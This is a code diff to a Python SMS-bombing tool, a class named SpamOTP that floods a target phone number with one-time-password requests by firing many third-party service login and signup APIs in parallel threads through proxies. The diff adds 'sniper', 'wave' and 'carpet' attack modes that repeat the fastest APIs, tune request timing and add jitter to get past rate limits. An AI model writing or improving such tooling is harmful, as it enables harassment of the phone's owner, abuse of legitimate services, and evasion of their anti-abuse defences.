@@ -24,9 +24,10 @@ USER_AGENTS = [
 # Encoding handling moved to run.bat via PYTHONIOENCODING
 
 class SpamOTP:
-    def __init__(self, phone, proxies=None):
+    def __init__(self, phone, proxies=None, attack_mode='carpet'):
         self.phone = phone
         self.proxies = proxies if proxies else []
+        self.attack_mode = attack_mode
         self.is_running = False
 
     def get_headers(self):
@@ -739,18 +740,43 @@ class SpamOTP:
             self.grab, self.be_group, self.elsa, self.medlatec
         ]
 
-        for api in apis:
+        # Tactical Mode Logic
+        if self.attack_mode == 'sniper':
+             # Focus on fast APIs
+             top_apis = [self.highlands, self.concung, self.grab, self.be_group, self.viettel_login]
+             apis = top_apis * 5
+             random.shuffle(apis)
+        elif self.attack_mode == 'wave':
+             random.shuffle(apis)
+        else:
+             random.shuffle(apis)
+
+        for i, api in enumerate(apis):
             t = threading.Thread(target=self._wrapper, args=(api, api.__name__))
             threads.append(t)
             t.start()
+            
+            # Dynamic Delay based on Mode
+            if self.attack_mode == 'sniper':
+                time.sleep(0.01) 
+            elif self.attack_mode == 'wave':
+                # Wave pattern
+                if i % 10 < 5:
+                    time.sleep(0.05) 
+                else:
+                    time.sleep(0.5) 
+            else:
+                time.sleep(random.uniform(0.05, 0.15))
         
         for t in threads:
             t.join()
         
-        if hasattr(self, 'log') and callable(self.log):
-            self.log(f"Đã gửi xong 1 lượt. Nghỉ {delay}s...")
+        # Jitter
+        if self.attack_mode == 'sniper':
+             final_delay = delay * 0.5 
         else:
-            print(f"Đã gửi xong 1 lượt. Nghỉ {delay}s...")
+             jitter = random.uniform(0.8, 1.2)
+             final_delay = delay * jitter
 
     def start_loop(self):
         self.is_running = True
